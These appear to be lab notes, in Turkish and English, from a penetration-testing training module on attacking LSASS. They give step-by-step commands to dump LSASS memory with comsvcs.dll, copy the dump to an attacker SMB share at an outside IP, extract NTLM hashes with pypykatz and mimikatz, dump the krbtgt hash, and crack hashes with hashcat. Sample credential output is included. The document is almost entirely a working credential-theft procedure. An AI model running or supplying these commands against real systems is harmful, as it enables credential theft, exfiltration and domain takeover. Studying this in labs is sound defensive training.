# Attacking LSASS

## Dumping Memory

!!! tip

    Ya da:

    * Task Manager
    * [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

LSASS PID bilgisini elde edelim:

```pwsh
PS C:\Users\htb-student> Get-Process lsass
```

```output title="Output"
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1108      24     5656      14992               656   0 lsass
```

Bellek dökümü oluşturmak için aşağıda verilen komutu kullanalım:

```pwsh
PS C:\Users\htb-student> rundll32 C:\Windows\System32\comsvcs.dll,MiniDump 656 C:\lsass.DMP full
```

## Transferring Memory Dump

### Creating a Share

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

### Moving Memory Dump to Share

```pwsh
PS C:\Users\htb-student> cmd.exe /c copy C:\lsass.DMP \\10.10.15.223\share
```

## Extracting Credentials

### [PyPyKatz](https://github.com/skelsec/pypykatz)

```sh
my@attack:/tmp$ pypykatz lsa minidump lsass.DMP
```

```output title="Output" hl_lines="10 17 22"
== LogonSession ==
authentication_id 127392 (1f1a0)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2024-12-08T21:00:55.082604+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 127392
    == MSV ==
        Username: Vendor
        Domain: FS01
        LM: NA
        NT: 31f87811133bc6aaa75a536e77f64314
        SHA1: 2b1c560c35923a8936263770a047764d0422caba
        DPAPI: 0000000000000000000000000000000000000000
    == WDIGEST [1f1a0]==
        username Vendor
        domainname FS01
        password None
        password (hex)
    == Kerberos ==
        Username: Vendor
        Domain: FS01
    == WDIGEST [1f1a0]==
        username Vendor
        domainname FS01
        password None
        password (hex)
```

### Mimikatz

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe privilege::debug "sekurlsa::minidump C:\lsass.DMP" sekurlsa::logonpasswords exit
```

```output title="Output" hl_lines="8 15 19"
Authentication Id : 0 ; 127392 (00000000:0001f1a0)
Session           : Service from 0
User Name         : Vendor
Domain            : FS01
Logon Server      : FS01
Logon Time        : 12/8/2024 1:00:55 PM
SID               : S-1-5-21-2288469977-2371064354-2971934342-1003
        msv :
         [00000003] Primary
         * Username : Vendor
         * Domain   : FS01
         * NTLM     : 31f87811133bc6aaa75a536e77f64314
         * SHA1     : 2b1c560c35923a8936263770a047764d0422caba
        tspkg :
        wdigest :
         * Username : Vendor
         * Domain   : FS01
         * Password : (null)
        kerberos :
         * Username : Vendor
         * Domain   : FS01
         * Password : (null)
        ssp :
        credman :
```

## Hash of the KRBTGT Account

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit
```

## Cracking the Hash

```sh
my@attack:~$ hashcat --hwmon-disable -a 0 -m 1000 Vendor.hash /usr/local/share/wordlists/rockyou.txt
```
